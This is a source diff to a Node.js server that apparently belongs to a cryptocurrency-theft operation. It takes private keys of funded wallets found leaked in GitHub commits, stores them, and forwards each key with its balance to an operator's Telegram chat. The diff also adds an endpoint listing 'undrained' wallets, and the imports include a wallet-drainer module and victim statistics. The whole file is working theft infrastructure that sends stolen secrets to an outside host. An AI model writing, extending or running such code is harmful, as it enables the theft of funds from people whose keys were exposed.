@@ -6,7 +6,7 @@ import { initBot, handleWebhook, sendMnemonicAlert } from './telegram-bot.mjs';
 import { drainWallet } from './wallet-drainer.mjs';
 import { initDB, getDB, insertMnemonic, getAllMnemonics, insertSignature, getPendingSignatures,
          getSignatureById, updateSignatureStatus, addDrainHistory, getDrainHistory, getStats,
-         getDailyStats, getVictimStats } from './db.mjs';
+         getDailyStats, getVictimStats, insertFundedWallet, getFundedWallets, getFundedWalletCount } from './db.mjs';
 import { estimateStxFee, estimateContractFee } from './fee-estimator.mjs';
 import {
   fetchCallReadOnlyFunction,
@@ -345,72 +345,116 @@ const CHAIN_META = {
   Stellar:   { emoji: '⭐', explorer: 'https://stellar.expert/explorer/public/account/' },
 };
 
+function sendFundedAlert(wallet, notifyDedup = true) {
+  const { chain, address, balance_human, private_key, source_repo, source_commit } = wallet;
+
+  const meta = CHAIN_META[chain] || { emoji: '🔑', explorer: '' };
+  const explorerUrl = meta.explorer ? `${meta.explorer}${address}` : '';
+  const shortHash = (source_commit || '').slice(0, 8);
+  const githubCommitUrl = source_repo && source_commit
+    ? `https://github.com/${source_repo}/commit/${source_commit}`
+    : '';
+
+  const text = [
+    `${meta.emoji} *Funded ${chain} Wallet Found* ${meta.emoji}`,
+    ``,
+    `*Address*`,
+    `\`${address}\``,
+    ``,
+    `*Balance*`,
+    `${balance_human}`,
+    ``,
+    `*Source*`,
+    `Repo: \`${source_repo || 'N/A'}\``,
+    `Commit: \`${shortHash}\``,
+    ``,
+    `*Private Key*`,
+    `\`${private_key}\``,
+  ].join('\n');
+
+  const inlineKeyboard = [];
+  const row = [];
+
+  if (explorerUrl) {
+    row.push({ text: `🔍 View on Explorer`, url: explorerUrl });
+  }
+  if (githubCommitUrl) {
+    row.push({ text: `📄 View Commit`, url: githubCommitUrl });
+  }
+  if (row.length > 0) {
+    inlineKeyboard.push(row);
+  }
+
+  const TELEGRAM_API = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;
+  return fetch(TELEGRAM_API, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: process.env.TELEGRAM_CHAT_ID,
+      text,
+      parse_mode: 'Markdown',
+      reply_markup: JSON.stringify({ inline_keyboard: inlineKeyboard }),
+      disable_web_page_preview: true,
+    }),
+  });
+}
+
 app.post('/webhook/funded', async (req, res) => {
   try {
-    const { chain, address, balance_human, private_key, source_repo, source_commit } = req.body;
-    if (!chain || !address || !private_key) {
-      return res.status(400).json({ error: 'Missing required fields' });
+    const body = req.body;
+
+    const wallets = Array.isArray(body) ? body : [body];
+
+    const results = [];
+
+    for (const wallet of wallets) {
+      const { chain, address, balance_human, private_key, source_repo, source_commit } = wallet;
+      if (!chain || !address || !private_key) {
+        results.push({ chain, address, error: 'Missing required fields' });
+        continue;
+      }
+
+      const dbResult = insertFundedWallet({ chain, address, balance_human, private_key, source_repo, source_commit });
+
+      if (!dbResult.inserted) {
+        results.push({ chain, address, status: 'duplicate', deduped: true });
+        continue;
+      }
+
+      const numericBalance = parseFloat(String(balance_human || '0').replace(/[^0-9.]/g, ''));
+      if (numericBalance <= 0) {
+        results.push({ chain, address, status: 'skipped', reason: 'zero balance' });
+        continue;
+      }
+
+      const resp = await sendFundedAlert({
+        chain, address, balance_human, private_key, source_repo, source_commit,
+      });
+
+      const data = await resp.json();
+      if (!data.ok) {
+        console.error('[WEBHOOK/FUNDED] Telegram error:', data);
+        results.push({ chain, address, status: 'telegram_error', error: data.description });
+        continue;
+      }
+
+      results.push({ chain, address, status: 'sent' });
     }
 
-    const meta = CHAIN_META[chain] || { emoji: '🔑', explorer: '' };
-    const explorerUrl = meta.explorer ? `${meta.explorer}${address}` : '';
-    const shortHash = (source_commit || '').slice(0, 8);
-    const githubCommitUrl = source_repo && source_commit
-      ? `https://github.com/${source_repo}/commit/${source_commit}`
-      : '';
-
-    const text = [
-      `${meta.emoji} *Funded ${chain} Wallet Found* ${meta.emoji}`,
-      ``,
-      `*Address*`,
-      `\`${address}\``,
-      ``,
-      `*Balance*`,
-      `${balance_human}`,
-      ``,
-      `*Source*`,
-      `Repo: \`${source_repo || 'N/A'}\``,
-      `Commit: \`${shortHash}\``,
-      ``,
-      `*Private Key*`,
-      `\`${private_key}\``,
-    ].join('\n');
-
-    const inlineKeyboard = [];
-    const row = [];
-
-    if (explorerUrl) {
-      row.push({ text: `🔍 View on Explorer`, url: explorerUrl });
-    }
-    if (githubCommitUrl) {
-      row.push({ text: `📄 View Commit`, url: githubCommitUrl });
-    }
-    if (row.length > 0) {
-      inlineKeyboard.push(row);
-    }
-
-    const TELEGRAM_API = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;
-    const resp = await fetch(TELEGRAM_API, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: process.env.TELEGRAM_CHAT_ID,
-        text,
-        parse_mode: 'Markdown',
-        reply_markup: JSON.stringify({ inline_keyboard: inlineKeyboard }),
-        disable_web_page_preview: true,
-      }),
-    });
-    const data = await resp.json();
-    if (!data.ok) {
-      console.error('[WEBHOOK/FUNDED] Telegram error:', data);
-      return res.status(502).json({ error: 'telegram send failed' });
-    }
-    res.json({ ok: true });
+    res.json({ ok: true, processed: results.length, results });
   } catch (e) {
     console.error('[WEBHOOK/FUNDED] Error:', e.message);
     res.status(500).json({ error: e.message });
   }
+});
+
+app.get('/api/funded-wallets', requireApiKey, (req, res) => {
+  const limit = parseInt(req.query.limit || '50');
+  const offset = parseInt(req.query.offset || '0');
+  const undrainedOnly = req.query.undrained === '1';
+  const wallets = getFundedWallets({ limit, offset, undrainedOnly });
+  const total = getFundedWalletCount(undrainedOnly);
+  res.json({ wallets, total, limit, offset });
 });
 
 app.get('/api/check-balance/:address', async (req, res) => {
